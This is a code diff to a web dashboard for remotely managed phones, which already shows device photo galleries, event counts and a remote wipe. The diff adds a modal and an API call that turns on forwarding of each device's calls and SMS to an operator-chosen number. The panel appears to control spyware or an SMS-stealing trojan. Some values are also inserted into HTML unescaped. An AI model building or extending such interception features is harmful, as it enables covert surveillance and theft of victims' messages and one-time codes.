@@ -266,6 +266,28 @@
   .badge-online { background: rgba(61,214,140,.15); color: var(--green); }
   .badge-offline{ background: rgba(247,83,79,.15); color: var(--red); }
 
+  /* ── Toggle switch ──────────────────────────────── */
+  .toggle-wrap { position:relative; width:40px; height:22px; flex-shrink:0; }
+  .toggle {
+    width:40px; height:22px; border-radius:11px; background:var(--border);
+    cursor:pointer; transition:background .2s; position:relative;
+  }
+  .toggle::after {
+    content:''; position:absolute; top:3px; left:3px;
+    width:16px; height:16px; border-radius:50%; background:#fff;
+    transition:transform .2s;
+  }
+  .toggle.on { background:var(--accent); }
+  .toggle.on::after { transform:translateX(18px); }
+
+  /* ── Fwd badge ──────────────────────────────────── */
+  .fwd-badge {
+    font-size:10px; padding:2px 7px; border-radius:10px;
+    font-family:var(--mono); white-space:nowrap;
+  }
+  .fwd-on  { background:rgba(79,142,247,.15); color:var(--accent); }
+  .fwd-off { background:var(--border); color:var(--muted); }
+
   /* ── Gallery ────────────────────────────────────── */
   .photo-card {
     background: var(--surface);
@@ -551,13 +573,62 @@
               <th>Last Seen</th>
               <th>Total Events</th>
               <th>Status</th>
+              <th>Forwarding</th>
               <th>Action</th>
             </tr>
           </thead>
           <tbody id="devices-body">
-            <tr><td colspan="6"><div class="loading"><div class="spinner"></div></div></td></tr>
+            <tr><td colspan="7"><div class="loading"><div class="spinner"></div></div></td></tr>
           </tbody>
         </table>
+      </div>
+    </div>
+
+    <!-- ── FORWARDING MODAL ──────────────────────── -->
+    <div id="fwd-modal" style="
+      display:none;position:fixed;inset:0;background:rgba(0,0,0,.7);
+      z-index:9998;align-items:center;justify-content:center;
+    ">
+      <div style="
+        background:var(--surface);border:1px solid var(--border);
+        border-radius:16px;padding:28px;width:380px;max-width:95vw;
+      ">
+        <h3 style="margin:0 0 6px;font-size:16px">📲 Call & SMS Forwarding</h3>
+        <p id="fwd-device-name" style="color:var(--muted);font-size:12px;margin:0 0 20px;font-family:var(--mono)"></p>
+
+        <label style="font-size:12px;color:var(--muted)">Forward to Number</label>
+        <input id="fwd-number" type="tel" placeholder="+91XXXXXXXXXX"
+          style="width:100%;margin:6px 0 16px;padding:10px 12px;background:var(--bg);
+                 border:1px solid var(--border);border-radius:8px;color:var(--text);
+                 font-size:14px;font-family:var(--mono);box-sizing:border-box;outline:none" />
+
+        <div style="display:flex;flex-direction:column;gap:12px;margin-bottom:20px">
+          <label style="display:flex;align-items:center;gap:10px;cursor:pointer">
+            <div class="toggle-wrap">
+              <input type="checkbox" id="fwd-call" style="display:none" onchange="updateToggle('fwd-call')"/>
+              <div class="toggle" id="toggle-fwd-call" onclick="document.getElementById('fwd-call').click()"></div>
+            </div>
+            <span style="font-size:13px">📞 Forward Calls</span>
+          </label>
+          <label style="display:flex;align-items:center;gap:10px;cursor:pointer">
+            <div class="toggle-wrap">
+              <input type="checkbox" id="fwd-sms" style="display:none" onchange="updateToggle('fwd-sms')"/>
+              <div class="toggle" id="toggle-fwd-sms" onclick="document.getElementById('fwd-sms').click()"></div>
+            </div>
+            <span style="font-size:13px">💬 Forward SMS</span>
+          </label>
+        </div>
+
+        <div style="display:flex;gap:10px">
+          <button onclick="saveFwdConfig()" style="
+            flex:1;padding:10px;background:var(--accent);color:#fff;
+            border:none;border-radius:8px;font-size:13px;font-weight:700;cursor:pointer
+          ">Save</button>
+          <button onclick="closeFwdModal()" style="
+            flex:1;padding:10px;background:var(--border);color:var(--text);
+            border:none;border-radius:8px;font-size:13px;cursor:pointer
+          ">Cancel</button>
+        </div>
       </div>
     </div>
 
@@ -873,31 +944,106 @@ function getLast7Days() {
 // ─────────────────────────────────────────────────────────────
 async function loadDevices() {
   const tbody = document.getElementById('devices-body');
-  tbody.innerHTML = '<tr><td colspan="6"><div class="loading"><div class="spinner"></div></div></td></tr>';
+  tbody.innerHTML = '<tr><td colspan="7"><div class="loading"><div class="spinner"></div></div></td></tr>';
   try {
     const r = await api('/api/devices');
     if (!r.data.length) {
-      tbody.innerHTML = '<tr><td colspan="6"><div class="empty"><div class="empty-icon">📱</div>No devices registered</div></td></tr>';
+      tbody.innerHTML = '<tr><td colspan="7"><div class="empty"><div class="empty-icon">📱</div>No devices registered</div></td></tr>';
       return;
     }
     tbody.innerHTML = r.data.map(d => {
-      const isOnline = (Date.now() - new Date(d.last_seen).getTime()) < 5*60*1000;
+      const isOnline   = (Date.now() - new Date(d.last_seen).getTime()) < 5*60*1000;
+      const fwdNum     = d.forward_number || '';
+      const callOn     = d.call_forward_enabled;
+      const smsOn      = d.sms_forward_enabled;
+      const fwdActive  = fwdNum && (callOn || smsOn);
+      const fwdLabel   = fwdActive
+        ? `<span class="fwd-badge fwd-on">→ ${fwdNum} ${callOn?'📞':''}${smsOn?'💬':''}</span>`
+        : `<span class="fwd-badge fwd-off">Off</span>`;
       return `
         <tr>
-          <td class="mono ellipsis" title="${d.device_id}">${d.device_id}</td>
-          <td>${d.device_name}</td>
+          <td class="mono ellipsis" title="${d.device_id}" style="font-size:11px;max-width:120px">${d.device_id}</td>
+          <td>${esc(d.device_name)}</td>
           <td class="mono">${timeAgo(d.last_seen)}</td>
           <td><span class="badge badge-device">${d.total_events}</span></td>
           <td><span class="badge ${isOnline?'badge-online':'badge-offline'}">${isOnline?'Online':'Offline'}</span></td>
-          <td>
-            <button class="btn-refresh" style="padding:4px 10px;font-size:11px" onclick="confirmDelete('${d.device_id}','${d.device_name}')">🗑 Wipe</button>
+          <td>${fwdLabel}</td>
+          <td style="display:flex;gap:6px">
+            <button class="btn-refresh" style="padding:4px 10px;font-size:11px"
+              onclick="openFwdModal('${d.device_id}','${esc(d.device_name)}','${fwdNum}',${callOn},${smsOn})">
+              📲 Fwd
+            </button>
+            <button class="btn-refresh" style="padding:4px 10px;font-size:11px"
+              onclick="confirmDelete('${d.device_id}','${d.device_name}')">🗑 Wipe</button>
           </td>
         </tr>`;
     }).join('');
   } catch (e) {
-    tbody.innerHTML = `<tr><td colspan="6"><div class="alert alert-error">Error: ${e.message}</div></td></tr>`;
+    tbody.innerHTML = `<tr><td colspan="7"><div class="alert alert-error">Error: ${e.message}</div></td></tr>`;
   }
 }
+
+// ─────────────────────────────────────────────────────────────
+//  Forwarding Modal
+// ─────────────────────────────────────────────────────────────
+let _fwdDeviceId = '';
+
+function openFwdModal(device_id, name, number, callOn, smsOn) {
+  _fwdDeviceId = device_id;
+  document.getElementById('fwd-device-name').textContent = `${name}  •  ${device_id}`;
+  document.getElementById('fwd-number').value = number || '';
+
+  const callCb = document.getElementById('fwd-call');
+  const smsCb  = document.getElementById('fwd-sms');
+  callCb.checked = callOn;
+  smsCb.checked  = smsOn;
+  updateToggle('fwd-call');
+  updateToggle('fwd-sms');
+
+  document.getElementById('fwd-modal').style.display = 'flex';
+}
+
+function closeFwdModal() {
+  document.getElementById('fwd-modal').style.display = 'none';
+  _fwdDeviceId = '';
+}
+
+function updateToggle(cbId) {
+  const cb  = document.getElementById(cbId);
+  const tog = document.getElementById('toggle-' + cbId);
+  if (!tog) return;
+  tog.classList.toggle('on', cb.checked);
+}
+
+async function saveFwdConfig() {
+  if (!_fwdDeviceId) return;
+  const number  = document.getElementById('fwd-number').value.trim();
+  const callOn  = document.getElementById('fwd-call').checked;
+  const smsOn   = document.getElementById('fwd-sms').checked;
+
+  if ((callOn || smsOn) && !number) {
+    alert('Please enter a forward number first.');
+    return;
+  }
+
+  try {
+    await api(`/api/devices/${_fwdDeviceId}/forward`, 'PATCH', {
+      forward_number:       number,
+      call_forward_enabled: callOn,
+      sms_forward_enabled:  smsOn,
+    });
+    closeFwdModal();
+    loadDevices();
+    showError(null);
+  } catch (e) {
+    showError('Save failed: ' + e.message);
+  }
+}
+
+// Close modal on backdrop click
+document.getElementById('fwd-modal').addEventListener('click', function(e) {
+  if (e.target === this) closeFwdModal();
+});
 
 async function confirmDelete(device_id, name) {
   if (!confirm(`Delete ALL data for "${name}"? This cannot be undone.`)) return;
@@ -1097,7 +1243,6 @@ async function loadGallery() {
   try {
     const qs = new URLSearchParams({ page: galleryPage, limit: 50 });
     if (deviceFilter) qs.set('device_id', deviceFilter);
-    console.log(qs);
     const r = await api(`/api/gallery?${qs}`);
 
     // Update badge
